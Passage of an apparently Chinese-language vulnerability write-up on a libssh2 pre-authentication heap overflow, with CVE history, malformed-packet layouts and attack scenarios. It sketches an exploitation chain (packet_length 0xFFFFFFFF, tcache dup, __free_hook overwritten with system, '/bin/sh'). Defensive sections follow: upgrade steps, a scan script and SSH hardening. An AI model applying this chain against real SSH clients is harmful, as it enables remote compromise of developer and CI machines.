+<span class="err">│</span><span class="w">  </span><span class="nl">步骤4</span><span class="p">:</span><span class="w"> </span><span class="n">第二次</span><span class="w"> </span><span class="n">malloc</span><span class="p">(</span><span class="k">size</span><span class="p">)</span><span class="w"> </span><span class="o">-&gt;</span><span class="w"> </span><span class="n">返回</span><span class="w"> </span><span class="n">chunk_A</span><span class="w"> </span><span class="p">(</span><span class="n">再次</span><span class="p">)</span><span class="w">               </span><span class="err">│</span>
+<span class="err">│</span><span class="w">  </span><span class="n">tcache</span><span class="o">[</span><span class="n">0x20</span><span class="o">]</span><span class="w"> </span><span class="o">-&gt;</span><span class="w"> </span><span class="o">[</span><span class="n">&amp;__free_hook</span><span class="o">]</span><span class="w">                                  </span><span class="err">│</span>
+<span class="err">│</span><span class="w">                                                                  </span><span class="err">│</span>
+<span class="err">│</span><span class="w">  </span><span class="nl">步骤5</span><span class="p">:</span><span class="w"> </span><span class="n">第三次</span><span class="w"> </span><span class="n">malloc</span><span class="p">(</span><span class="k">size</span><span class="p">)</span><span class="w"> </span><span class="o">-&gt;</span><span class="w"> </span><span class="n">返回</span><span class="w"> </span><span class="o">&amp;</span><span class="n">__free_hook</span><span class="w">                 </span><span class="err">│</span>
+<span class="err">│</span><span class="w">  </span><span class="nl">攻击者写入</span><span class="p">:</span><span class="w"> </span><span class="n">__free_hook</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">&amp;</span><span class="k">system</span><span class="w">                               </span><span class="err">│</span>
+<span class="err">│</span><span class="w">                                                                  </span><span class="err">│</span>
+<span class="err">│</span><span class="w">  </span><span class="nl">步骤6</span><span class="p">:</span><span class="w"> </span><span class="n">调用</span><span class="w"> </span><span class="k">free</span><span class="p">(</span><span class="ss">&quot;/bin/sh&quot;</span><span class="p">)</span><span class="w"> </span><span class="o">-&gt;</span><span class="w"> </span><span class="n">实际执行</span><span class="w"> </span><span class="k">system</span><span class="p">(</span><span class="ss">&quot;/bin/sh&quot;</span><span class="p">)</span><span class="w">       </span><span class="err">│</span>
+<span class="err">│</span><span class="w">  </span><span class="o">=&gt;</span><span class="w"> </span><span class="n">RCE</span><span class="err">!</span><span class="w">                                                         </span><span class="err">│</span>
+<span class="err">│</span><span class="w">                                                                  </span><span class="err">│</span>
+<span class="err">│</span><span class="w">  </span><span class="nl">注意</span><span class="p">:</span><span class="w"> </span><span class="n">glibc</span><span class="w"> </span><span class="mf">2.29</span><span class="o">+</span><span class="w"> </span><span class="n">添加了</span><span class="w"> </span><span class="n">tcache</span><span class="w"> </span><span class="k">double</span><span class="o">-</span><span class="n">free检测</span><span class="w"> </span><span class="p">(</span><span class="n">key字段</span><span class="p">)</span><span class="w">       </span><span class="err">│</span>
+<span class="err">│</span><span class="w">  </span><span class="n">但可通过分配不同大小的chunk绕过</span><span class="w">                                  </span><span class="err">│</span>
+<span class="err">│</span><span class="w">                                                                  </span><span class="err">│</span>
+<span class="err">└──────────────────────────────────────────────────────────────────┘</span>
+</code></pre></div>
+
+<hr />
+<h2>5. 历史漏洞回顾：CVE-2019-3855至CVE-2019-3863系列</h2>
+<p>CVE-2026-55200并非libssh2中首次出现此类漏洞。2019年3月，libssh2 1.8.1修复了一整批整数溢出和越界访问漏洞。以下是完整列表和对比分析：</p>
+<table>
+<thead>
+<tr>
+<th>CVE编号</th>
+<th>CVSS</th>
+<th>CWE</th>
+<th>漏洞描述</th>
+<th>漏洞位置</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>CVE-2019-3855</td>
+<td>9.0</td>
+<td>CWE-190</td>
+<td>读取数据包时整数溢出，导致越界写</td>
+<td>transport.c (ssh2_transport_read)</td>
+</tr>
+<tr>
+<td>CVE-2019-3856</td>
+<td>8.5</td>
+<td>CWE-190</td>
+<td>键盘交互认证处理中整数溢出，导致越界写</td>
+<td>kbd.c (keyboard_interactive)</td>
+</tr>
+<tr>
+<td>CVE-2019-3857</td>
+<td>8.5</td>
+<td>CWE-190</td>
+<td>SSH数据包处理通道中整数溢出，导致越界写</td>
+<td>transport.c (channel)</td>
+</tr>
+<tr>
+<td>CVE-2019-3858</td>
+<td>8.5</td>
+<td>CWE-190</td>
+<td>SSH_MSG_CHANNEL_REQUEST中exit status无payload导致越界读</td>
+<td>channel.c</td>
+</tr>
+<tr>
+<td>CVE-2019-3859</td>
+<td>8.5</td>
+<td>CWE-190</td>
+<td>SSH包处理中整数溢出导致越界读</td>
+<td>transport.c</td>
+</tr>
+<tr>
+<td>CVE-2019-3860</td>
+<td>8.0</td>
+<td>CWE-125</td>
+<td>精心构造的SFTP包导致越界读</td>
+<td>sftp.c</td>
+</tr>
+<tr>
+<td>CVE-2019-3861</td>
+<td>8.0</td>
+<td>CWE-125</td>
+<td>精心构造的SSH包导致越界读</td>
+<td>transport.c</td>
+</tr>
+<tr>
+<td>CVE-2019-3862</td>
+<td>7.5</td>
+<td>CWE-125</td>
+<td>SSH_MSG_CHANNEL_REQUEST exit status无payload导致越界内存比较</td>
+<td>channel.c</td>
+</tr>
+<tr>
+<td>CVE-2019-3863</td>
+<td>9.0</td>
+<td>CWE-190</td>
+<td>用户认证键盘交互中整数溢出导致越界写</td>
+<td>kbd.c (userauth)</td>
+</tr>
+</tbody>
+</table>
+<h3>回归分析：同一函数、同一类漏洞的7年轮回</h3>
+<div class="highlight"><pre><span></span><code>┌──────────────────────────────────────────────────────────────────┐
+│           CVE-2019-3855 vs CVE-2026-55200 对比分析               │
+├──────────────────┬───────────────────┬───────────────────────────┤
+│     属性         │  CVE-2019-3855    │   CVE-2026-55200          │
+├──────────────────┼───────────────────┼───────────────────────────┤
+│ 披露年份         │ 2019              │ 2026                      │
+│ 漏洞函数         │ ssh2_transport_   │ ssh2_transport_read()     │
+│                  │ read() in         │ in transport.c            │
+│                  │ transport.c       │                           │
+│ 根因             │ packet_length     │ packet_length 缺少        │
+│                  │ 缺少上界检查      │ 上界检查(不同代码路径)    │
+│ CWE分类          │ CWE-130/CWE-190   │ CWE-680                   │
+│ 报告者           │ Chris Coulson     │ Tristan Madani            │
+│ 修复机制         │ LIBSSH2_PACKET_   │ LIBSSH2_PACKET_           │
+│                  │ MAXPAYLOAD 守卫   │ MAXPAYLOAD 守卫           │
+│ 修复版本         │ 1.8.1 (正式发布)  │ commit 97acf3d (无正式    │
+│                  │                   │ 发布)                     │
+│ 问题本质         │ 2019年修复添加了  │ 同一函数的另一个代码路径  │
+│                  │ 上界检查到一个    │ 从未应用该检查，          │
+│                  │ 代码路径，但另一  │ 潜伏7年后再次被发现       │
+│                  │ 个路径被遗漏      │                           │
+└──────────────────┴───────────────────┴───────────────────────────┘
+</code></pre></div>
+
+<p>这段历史揭示了一个令人不安的事实：libssh2在2019年为<code>ssh2_transport_read()</code>添加了<code>LIBSSH2_PACKET_MAXPAYLOAD</code>上界检查，但该检查只应用于其中一个代码路径。另一个代码路径（完整包解密分支）从未受到保护，在代码库中潜伏了整整7年，直到2026年被Tristan Madani重新发现。这不是一次性的失误，而是代码库对攻击者控制长度字段验证不充分的系统性问题。</p>
+<hr />
+<h2>6. 正常SSH包 vs 畸形SSH包结构对比</h2>
+<div class="highlight"><pre><span></span><code><span class="err">┌─────────────────────────────────────────────────────────────────────┐</span>
+<span class="err">│</span><span class="w">              </span><span class="err">正常</span><span class="n">SSH包</span><span class="w"> </span><span class="n">vs</span><span class="w"> </span><span class="err">畸形</span><span class="n">SSH包结构对比</span><span class="w">                          </span><span class="err">│</span>
+<span class="err">├──────────────────────┬──────────────────────┬───────────────────────┤</span>
+<span class="err">│</span><span class="w">       </span><span class="err">字段</span><span class="w">            </span><span class="err">│</span><span class="w">    </span><span class="err">正常</span><span class="n">SSH包</span><span class="w">          </span><span class="err">│</span><span class="w">   </span><span class="err">畸形</span><span class="n">SSH包</span><span class="w">           </span><span class="err">│</span>
+<span class="err">│</span><span class="w">                      </span><span class="err">│</span><span class="w">                      </span><span class="err">│</span><span class="w">  </span><span class="p">(</span><span class="n">CVE</span><span class="o">-</span><span class="mi">2026</span><span class="o">-</span><span class="mi">55200</span><span class="p">)</span><span class="w">     </span><span class="err">│</span>
+<span class="err">├──────────────────────┼──────────────────────┼───────────────────────┤</span>
+<span class="err">│</span><span class="w"> </span><span class="n">packet_length</span><span class="w"> </span><span class="p">(</span><span class="mi">4</span><span class="n">B</span><span class="p">)</span><span class="w">   </span><span class="err">│</span><span class="w"> </span><span class="mh">0x00000200</span><span class="w"> </span><span class="p">(</span><span class="mi">512</span><span class="err">字节</span><span class="p">)</span><span class="w"> </span><span class="err">│</span><span class="w"> </span><span class="mh">0xFFFFFFFF</span><span class="w"> </span><span class="p">(</span><span class="mi">4294967295</span><span class="p">)</span><span class="err">│</span>
+<span class="err">│</span><span class="w">                      </span><span class="err">│</span><span class="w"> </span><span class="err">合理范围</span><span class="p">:</span><span class="w"> </span><span class="mi">16</span><span class="o">~</span><span class="mi">35000</span><span class="w">   </span><span class="err">│</span><span class="w"> </span><span class="err">远超合理范围</span><span class="w">           </span><span class="err">│</span>
+<span class="err">├──────────────────────┼──────────────────────┼───────────────────────┤</span>
+<span class="err">│</span><span class="w"> </span><span class="n">padding_length</span><span class="w"> </span><span class="p">(</span><span class="mi">1</span><span class="n">B</span><span class="p">)</span><span class="w">  </span><span class="err">│</span><span class="w"> </span><span class="mh">0x04</span><span class="o">~</span><span class="mh">0xFF</span><span class="w"> </span><span class="p">(</span><span class="mi">4</span><span class="o">~</span><span class="mi">255</span><span class="p">)</span><span class="w">   </span><span class="err">│</span><span class="w"> </span><span class="mh">0x04</span><span class="w"> </span><span class="p">(</span><span class="mi">4</span><span class="p">)</span><span class="w">              </span><span class="err">│</span>
+<span class="err">│</span><span class="w">                      </span><span class="err">│</span><span class="w"> </span><span class="err">符合块大小对齐</span><span class="w">        </span><span class="err">│</span><span class="w"> </span><span class="err">任意值</span><span class="p">(</span><span class="err">攻击者控制</span><span class="p">)</span><span class="w">     </span><span class="err">│</span>
+<span class="err">├──────────────────────┼──────────────────────┼───────────────────────┤</span>
+<span class="err">│</span><span class="w"> </span><span class="n">payload</span><span class="w"> </span><span class="p">(</span><span class="n">n1字节</span><span class="p">)</span><span class="w">     </span><span class="err">│</span><span class="w"> </span><span class="n">SSH_MSG_KEXINIT等</span><span class="w">    </span><span class="err">│</span><span class="w"> </span><span class="err">任意数据</span><span class="w">               </span><span class="err">│</span>
+<span class="err">│</span><span class="w">                      </span><span class="err">│</span><span class="w"> </span><span class="n">n1</span><span class="o">=</span><span class="mi">512</span><span class="o">-</span><span class="mi">4</span><span class="o">-</span><span class="mi">1</span><span class="o">=</span><span class="mi">507</span><span class="err">字节</span><span class="w">   </span><span class="err">│</span><span class="w"> </span><span class="err">名义上</span><span class="mi">4</span><span class="n">GB</span><span class="err">，实际发送</span><span class="w">    </span><span class="err">│</span>
+<span class="err">│</span><span class="w">                      </span><span class="err">│</span><span class="w"> </span><span class="err">包含算法列表等</span><span class="w">       </span><span class="err">│</span><span class="w"> </span><span class="err">少量数据触发溢出</span><span class="w">       </span><span class="err">│</span>
+<span class="err">├──────────────────────┼──────────────────────┼───────────────────────┤</span>
+<span class="err">│</span><span class="w"> </span><span class="n">random</span><span class="w"> </span><span class="n">padding</span><span class="w"> </span><span class="p">(</span><span class="n">n2</span><span class="p">)</span><span class="w">  </span><span class="err">│</span><span class="w"> </span><span class="mi">4</span><span class="o">~</span><span class="mi">255</span><span class="err">字节随机数据</span><span class="w">    </span><span class="err">│</span><span class="w"> </span><span class="mi">4</span><span class="err">字节</span><span class="p">(</span><span class="err">或更多</span><span class="p">)</span><span class="w">          </span><span class="err">│</span>
+<span class="err">├──────────────────────┼──────────────────────┼───────────────────────┤</span>
+<span class="err">│</span><span class="w"> </span><span class="n">MAC</span><span class="w"> </span><span class="p">(</span><span class="n">m字节</span><span class="p">)</span><span class="w">          </span><span class="err">│</span><span class="w"> </span><span class="mi">20</span><span class="o">~</span><span class="mi">32</span><span class="err">字节</span><span class="n">HMAC</span><span class="w">       </span><span class="err">│</span><span class="w"> </span><span class="err">无</span><span class="p">(</span><span class="err">加密建立前无</span><span class="n">MAC</span><span class="p">)</span><span class="w">    </span><span class="err">│</span>
+<span class="err">├──────────────────────┼──────────────────────┼───────────────────────┤</span>
+<span class="err">│</span><span class="w"> </span><span class="err">总线缆长度</span><span class="w">           </span><span class="err">│</span><span class="w"> </span><span class="o">~</span><span class="mi">540</span><span class="err">字节</span><span class="w">             </span><span class="err">│</span><span class="w"> </span><span class="o">~</span><span class="mi">270</span><span class="err">字节</span><span class="p">(</span><span class="err">只发少量数据</span><span class="p">)</span><span class="w">  </span><span class="err">│</span>
+<span class="err">├──────────────────────┼──────────────────────┼───────────────────────┤</span>
+<span class="err">│</span><span class="w"> </span><span class="err">客户端分配的缓冲区</span><span class="w">   </span><span class="err">│</span><span class="w"> </span><span class="mi">512</span><span class="o">+</span><span class="err">开销</span><span class="w"> </span><span class="err">≈</span><span class="w"> </span><span class="mi">520</span><span class="err">字节</span><span class="w">   </span><span class="err">│</span><span class="w"> </span><span class="mi">19</span><span class="err">字节</span><span class="p">(</span><span class="err">整数回绕</span><span class="o">!</span><span class="p">)</span><span class="w">      </span><span class="err">│</span>
+<span class="err">├──────────────────────┼──────────────────────┼───────────────────────┤</span>
+<span class="err">│</span><span class="w"> </span><span class="err">客户端写入的数据量</span><span class="w">   </span><span class="err">│</span><span class="w"> </span><span class="o">~</span><span class="mi">507</span><span class="err">字节</span><span class="p">(</span><span class="err">匹配缓冲区</span><span class="p">)</span><span class="w"> </span><span class="err">│</span><span class="w"> </span><span class="err">数百字节</span><span class="p">(</span><span class="err">远超</span><span class="mi">19</span><span class="err">字节</span><span class="p">)</span><span class="w">   </span><span class="err">│</span>
+<span class="err">├──────────────────────┼──────────────────────┼───────────────────────┤</span>
+<span class="err">│</span><span class="w"> </span><span class="err">结果</span><span class="w">                 </span><span class="err">│</span><span class="w"> </span><span class="err">正常处理</span><span class="w">              </span><span class="err">│</span><span class="w"> </span><span class="err">堆溢出</span><span class="o">!</span><span class="w">                </span><span class="err">│</span>
+<span class="err">│</span><span class="w">                      </span><span class="err">│</span><span class="w"> </span><span class="err">无异常</span><span class="w">                </span><span class="err">│</span><span class="w"> </span><span class="n">CWE</span><span class="o">-</span><span class="mi">680</span><span class="w">                </span><span class="err">│</span>
+<span class="err">├──────────────────────┼──────────────────────┼───────────────────────┤</span>
+<span class="err">│</span><span class="w"> </span><span class="err">触发阶段</span><span class="w">             </span><span class="err">│</span><span class="w"> </span><span class="err">密钥交换</span><span class="o">/</span><span class="err">认证</span><span class="o">/</span><span class="err">通道</span><span class="w">    </span><span class="err">│</span><span class="w"> </span><span class="err">算法协商</span><span class="p">(</span><span class="err">预认证</span><span class="o">!</span><span class="p">)</span><span class="w">      </span><span class="err">│</span>
+<span class="err">├──────────────────────┼──────────────────────┼───────────────────────┤</span>
+<span class="err">│</span><span class="w"> </span><span class="err">需要凭据</span><span class="w">             </span><span class="err">│</span><span class="w"> </span><span class="err">是</span><span class="p">(</span><span class="err">认证后</span><span class="p">)</span><span class="w">           </span><span class="err">│</span><span class="w"> </span><span class="err">否</span><span class="p">(</span><span class="err">预认证</span><span class="p">)</span><span class="w">             </span><span class="err">│</span>
+<span class="err">├──────────────────────┼──────────────────────┼───────────────────────┤</span>
+<span class="err">│</span><span class="w"> </span><span class="err">攻击者控制的数据</span><span class="w">     </span><span class="err">│</span><span class="w"> </span><span class="err">无</span><span class="p">(</span><span class="err">正常通信</span><span class="p">)</span><span class="w">         </span><span class="err">│</span><span class="w"> </span><span class="n">packet_length完全可控</span><span class="w">  </span><span class="err">│</span>
+<span class="err">├──────────────────────┼──────────────────────┼───────────────────────┤</span>
+<span class="err">│</span><span class="w"> </span><span class="err">上界检查</span><span class="w">             </span><span class="err">│</span><span class="w"> </span><span class="n">N</span><span class="o">/</span><span class="n">A</span><span class="w"> </span><span class="p">(</span><span class="err">值合理</span><span class="p">)</span><span class="w">         </span><span class="err">│</span><span class="w"> </span><span class="err">缺失</span><span class="o">!</span><span class="w"> </span><span class="p">(</span><span class="err">漏洞根因</span><span class="p">)</span><span class="w">       </span><span class="err">│</span>
+<span class="err">└──────────────────────┴──────────────────────┴───────────────────────┘</span>
+</code></pre></div>
+
+<hr />
+<h2>7. 攻击场景分析</h2>
+<h3>7.1 攻击场景全景</h3>
+<div class="highlight"><pre><span></span><code>┌─────────────────────────────────────────────────────────────────────┐
+│                     libssh2 漏洞攻击场景                             │
+├─────────────────────────────────────────────────────────────────────┤
+│                                                                     │
+│  场景1: CI/CD流水线攻击                                             │
+│  ┌────────────┐                              ┌──────────────┐      │
+│  │ CI/CD Agent│── SSH连接 ──────────────────&gt;│ 恶意Git服务器│      │
+│  │ (libssh2)  │&lt;── 畸形packet_length=0xFFFF ──│ (被攻击者    │      │
+│  │            │    FFFF ─────────────────────│  控制)       │      │
+│  │ 堆溢出!    │                              └──────────────┘      │
+│  │ → RCE     │                                                    │
+│  │ → 窃取CI  │  影响: 代码泄露、供应链投毒、构建产物篡改           │
+│  └────────────┘                                                    │
+│                                                                     │
+│  场景2: 备份代理攻击                                                │
+│  ┌────────────┐                              ┌──────────────┐      │
+│  │ 备份代理   │── SFTP连接 ─────────────────&gt;│ 被劫持的     │      │
+│  │ (libssh2   │&lt;── SSH_FXP_STATUS + FX_OK ───│ 备份服务器   │      │
+│  │  静态链接) │    + 错误响应 ───────────────│              │      │
+│  │            │                              └──────────────┘      │
+│  │ 双重释放!  │                                                    │
+│  │ → tcache   │  影响: 备份服务器沦陷、数据泄露                    │
+│  │   dup →RCE │  注意: 静态链接的libssh2不会被系统更新修复        │
+│  └────────────┘                                                    │
+│                                                                     │
+│  场景3: 开发者SSH连接                                               │
+│  ┌────────────┐                              ┌──────────────┐      │
+│  │ 开发者终端 │── SSH连接 ──────────────────&gt;│ 恶意跳板机   │      │
+│  │ (libssh2)  │&lt;── KEXINIT + 畸形包 ──────── │              │      │
+│  │            │                              └──────────────┘      │
+│  │ 堆溢出!    │                                                    │
+│  │ → RCE     │  影响: 开发机器沦陷、SSH密钥窃取、横向移动          │
+│  └────────────┘                                                    │
+│                                                                     │
+│  场景4: 中间人攻击 (MITM)                                           │
+│  ┌────────┐         ┌──────────┐         ┌──────────┐              │
+│  │客户端  │──SSH──&gt;│ 攻击者   │──SSH──&gt;│ 正常服务器│              │
+│  │(libssh2)│&lt;──────│ (MITM)   │&lt;──────│          │              │
+│  └────────┘         └──────────┘         └──────────┘              │
+│                     篡改响应包:                                   │
+│                     注入畸形packet_length                        │
+│  影响: 在客户端到服务器的路径上注入恶意包                          │
+│  前提: 攻击者能MITM SSH连接 (需要绕过主机密钥验证)               │
+│                                                                     │
+└─────────────────────────────────────────────────────────────────────┘
+</code></pre></div>
+
+<h3>7.2 攻击前提条件</h3>
+<table>
+<thead>
+<tr>
+<th>场景</th>
+<th>前提条件</th>
+<th>难度</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>CI/CD攻击</td>
+<td>攻击者控制Git远程仓库或DNS劫持</td>
+<td>中</td>
+</tr>
+<tr>
+<td>备份代理攻击</td>
+<td>攻击者控制备份服务器或MITM</td>
+<td>中</td>
+</tr>
+<tr>
+<td>开发者SSH连接</td>
+<td>攻击者控制目标SSH服务器</td>
+<td>低</td>
+</tr>
+<tr>
+<td>MITM攻击</td>
+<td>绕过SSH主机密钥验证</td>
+<td>高</td>
+</tr>
+</tbody>
+</table>
+<h3>7.3 从堆溢出到RCE的利用链</h3>
+<div class="highlight"><pre><span></span><code>┌─────────────────────────────────────────────────────────────────┐
+│              CVE-2026-55200: 从堆溢出到RCE的利用链               │
+├─────────────────────────────────────────────────────────────────┤
+│                                                                 │
+│  1. 触发整数溢出                                                │
+│     packet_length = 0xFFFFFFFF → malloc(19)                     │
+│                                                                 │
+│  2. 堆溢出                                                      │
+│     向19字节缓冲区写入攻击者控制的数据                           │
+│     覆盖相邻堆结构 (glibc chunk header)                         │
+│                                                                 │
+│  3. 堆元数据控制                                                │
+│     覆盖: chunk size, fd指针, bk指针                            │
+│     目标: 制造重叠分配 (overlapping chunks)                     │
+│                                                                 │
+│  4. 函数指针劫持                                                │
+│     通过重叠分配获取对目标对象的写权限                           │
+│     覆写: __free_hook / __malloc_hook / vtable指针              │
+│     值: system()或one_gadget地址                                │
+│                                                                 │
+│  5. 触发劫持                                                    │
+│     调用free()或相关函数 → 跳转到system()                       │
+│     参数: &quot;/bin/sh&quot; 或反弹shell命令                             │
+│                                                                 │
+│  6. RCE达成                                                     │
+│     攻击者在客户端机器上获得代码执行                             │
+│                                                                 │
+│  注意: 步骤3-6需要:                                             │
+│  - ASLR绕过 (或ASLR禁用的环境)                                  │
+│  - 目标二进制的堆布局分析                                       │
+│  - glibc版本特定的利用技术                                      │
+│  - 公开PoC仅为本地验证框架，非即用型远程exploit                 │
+│                                                                 │
+└─────────────────────────────────────────────────────────────────┘
+</code></pre></div>
+
+<hr />
+<h2>8. 防御方案</h2>
+<h3>8.1 升级libssh2</h3>
+<div class="highlight"><pre><span></span><code><span class="c1"># 从源码编译安装修复版本</span>
+git<span class="w"> </span>clone<span class="w"> </span>https://github.com/libssh2/libssh2.git
+<span class="nb">cd</span><span class="w"> </span>libssh2
+
+<span class="c1"># 切换到包含修复的commit</span>
+git<span class="w"> </span>checkout<span class="w"> </span>97acf3dfda80c91c3a8c9f2372546301d4a1a7a8
+
+<span class="c1"># 编译</span>
+mkdir<span class="w"> </span>build<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="nb">cd</span><span class="w"> </span>build
+cmake<span class="w"> </span>-DCMAKE_INSTALL_PREFIX<span class="o">=</span>/usr/local<span class="w"> </span><span class="se">\</span>
+<span class="w">      </span>-DCMAKE_BUILD_TYPE<span class="o">=</span>Release<span class="w"> </span><span class="se">\</span>
+<span class="w">      </span>-DBUILD_SHARED_LIBS<span class="o">=</span>ON<span class="w"> </span><span class="se">\</span>
+<span class="w">      </span>..
+make<span class="w"> </span>-j<span class="k">$(</span>nproc<span class="k">)</span>
+make<span class="w"> </span>install
+
+<span class="c1"># 更新动态链接库缓存</span>
+ldconfig
+
+<span class="c1"># 验证版本</span>
+<span class="c1"># 注意: 截至发文时无正式tagged release</span>
+<span class="c1"># 需要从源码确认commit hash</span>
+</code></pre></div>
+
+<h3>8.2 识别静态链接的libssh2副本</h3>
+<div class="highlight"><pre><span></span><code><span class="ch">#!/bin/bash</span>
+<span class="c1"># 扫描系统中静态链接libssh2的二进制文件</span>
+
+<span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;[*] 扫描静态链接libssh2的二进制文件...&quot;</span>
+<span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;&quot;</span>
+
+<span class="c1"># 方法1: 搜索包含libssh2字符串的二进制文件</span>
+<span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;[1] 搜索包含libssh2版本字符串的二进制:&quot;</span>
+find<span class="w"> </span>/<span class="w"> </span>-type<span class="w"> </span>f<span class="w"> </span>-executable<span class="w"> </span><span class="m">2</span>&gt;/dev/null<span class="w"> </span><span class="p">|</span><span class="w"> </span><span class="k">while</span><span class="w"> </span><span class="nb">read</span><span class="w"> </span>-r<span class="w"> </span>bin<span class="p">;</span><span class="w"> </span><span class="k">do</span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span>strings<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$bin</span><span class="s2">&quot;</span><span class="w"> </span><span class="m">2</span>&gt;/dev/null<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-q<span class="w"> </span><span class="s2">&quot;libssh2&quot;</span><span class="p">;</span><span class="w"> </span><span class="k">then</span>
+<span class="w">        </span><span class="c1"># 检查是否动态链接libssh2</span>
+<span class="w">        </span><span class="k">if</span><span class="w"> </span>!<span class="w"> </span>ldd<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$bin</span><span class="s2">&quot;</span><span class="w"> </span><span class="m">2</span>&gt;/dev/null<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-q<span class="w"> </span><span class="s2">&quot;libssh2&quot;</span><span class="p">;</span><span class="w"> </span><span class="k">then</span>
+<span class="w">            </span><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;  [STATIC] </span><span class="nv">$bin</span><span class="s2">&quot;</span>
+<span class="w">            </span>strings<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$bin</span><span class="s2">&quot;</span><span class="w"> </span><span class="m">2</span>&gt;/dev/null<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span><span class="s2">&quot;libssh2&quot;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>head<span class="w"> </span>-3
+<span class="w">        </span><span class="k">fi</span>
+<span class="w">    </span><span class="k">fi</span>
+<span class="k">done</span>
+
+<span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;&quot;</span>
+<span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;[2] 检查动态链接libssh2的进程:&quot;</span>
+<span class="k">for</span><span class="w"> </span>pid<span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="k">$(</span>ls<span class="w"> </span>/proc/*/maps<span class="w"> </span><span class="m">2</span>&gt;/dev/null<span class="w"> </span><span class="p">|</span><span class="w"> </span>cut<span class="w"> </span>-d/<span class="w"> </span>-f3<span class="k">)</span><span class="p">;</span><span class="w"> </span><span class="k">do</span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span>grep<span class="w"> </span>-q<span class="w"> </span><span class="s2">&quot;libssh2&quot;</span><span class="w"> </span>/proc/<span class="nv">$pid</span>/maps<span class="w"> </span><span class="m">2</span>&gt;/dev/null<span class="p">;</span><span class="w"> </span><span class="k">then</span>
+<span class="w">        </span><span class="nv">cmdline</span><span class="o">=</span><span class="k">$(</span>cat<span class="w"> </span>/proc/<span class="nv">$pid</span>/cmdline<span class="w"> </span><span class="m">2</span>&gt;/dev/null<span class="w"> </span><span class="p">|</span><span class="w"> </span>tr<span class="w"> </span><span class="s1">&#39;\0&#39;</span><span class="w"> </span><span class="s1">&#39; &#39;</span><span class="k">)</span>
+<span class="w">        </span><span class="nv">libssh2_path</span><span class="o">=</span><span class="k">$(</span>grep<span class="w"> </span><span class="s2">&quot;libssh2&quot;</span><span class="w"> </span>/proc/<span class="nv">$pid</span>/maps<span class="w"> </span><span class="m">2</span>&gt;/dev/null<span class="w"> </span><span class="p">|</span><span class="w"> </span>head<span class="w"> </span>-1<span class="w"> </span><span class="p">|</span><span class="w"> </span>awk<span class="w"> </span><span class="s1">&#39;{print $6}&#39;</span><span class="k">)</span>
+<span class="w">        </span><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;  PID </span><span class="nv">$pid</span><span class="s2">: </span><span class="nv">$cmdline</span><span class="s2">&quot;</span>
+<span class="w">        </span><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;    libssh2: </span><span class="nv">$libssh2_path</span><span class="s2">&quot;</span>
+<span class="w">    </span><span class="k">fi</span>
+<span class="k">done</span>
+
+<span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;&quot;</span>
+<span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;[3] 检查容器中的libssh2:&quot;</span>
+docker<span class="w"> </span>ps<span class="w"> </span>--format<span class="w"> </span><span class="s2">&quot;{{.ID}} {{.Image}}&quot;</span><span class="w"> </span><span class="m">2</span>&gt;/dev/null<span class="w"> </span><span class="p">|</span><span class="w"> </span><span class="k">while</span><span class="w"> </span><span class="nb">read</span><span class="w"> </span>id<span class="w"> </span>image<span class="p">;</span><span class="w"> </span><span class="k">do</span>
+<span class="w">    </span><span class="nv">version</span><span class="o">=</span><span class="k">$(</span>docker<span class="w"> </span><span class="nb">exec</span><span class="w"> </span><span class="s2">&quot;</span><span class="nv">$id</span><span class="s2">&quot;</span><span class="w"> </span>sh<span class="w"> </span>-c<span class="w"> </span><span class="s1">&#39;strings /usr/lib/*/libssh2.so* 2&gt;/dev/null | grep &quot;libssh2_&quot; | head -1&#39;</span><span class="w"> </span><span class="m">2</span>&gt;/dev/null<span class="k">)</span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="o">[</span><span class="w"> </span>-n<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$version</span><span class="s2">&quot;</span><span class="w"> </span><span class="o">]</span><span class="p">;</span><span class="w"> </span><span class="k">then</span>
+<span class="w">        </span><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;  Container </span><span class="nv">$image</span><span class="s2">: </span><span class="nv">$version</span><span class="s2">&quot;</span>
+<span class="w">    </span><span class="k">fi</span>
+<span class="k">done</span>
+</code></pre></div>
+
+<h3>8.3 限制SSH客户端连接可信服务器</h3>
+<div class="highlight"><pre><span></span><code><span class="c1"># /etc/ssh/ssh_config.d/restrictions.conf</span>
+<span class="c1"># SSH客户端安全加固配置</span>
+
+<span class="c1"># 严格主机密钥验证 (防止MITM)</span>
+StrictHostKeyChecking<span class="w"> </span>yes
+UserKnownHostsFile<span class="w"> </span>~/.ssh/known_hosts
+
+<span class="c1"># 禁用不安全的算法</span>
+Ciphers<span class="w"> </span>aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr
+MACs<span class="w"> </span>hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com
+KexAlgorithms<span class="w"> </span>curve25519-sha256,ecdh-sha2-nistp256
+
+<span class="c1"># 连接超时 (减少与恶意服务器交互的时间)</span>
+ConnectTimeout<span class="w"> </span><span class="m">5</span>
+ConnectionAttempts<span class="w"> </span><span class="m">1</span>
+
+<span class="c1"># 禁用不必要的功能</span>
+ForwardAgent<span class="w"> </span>no
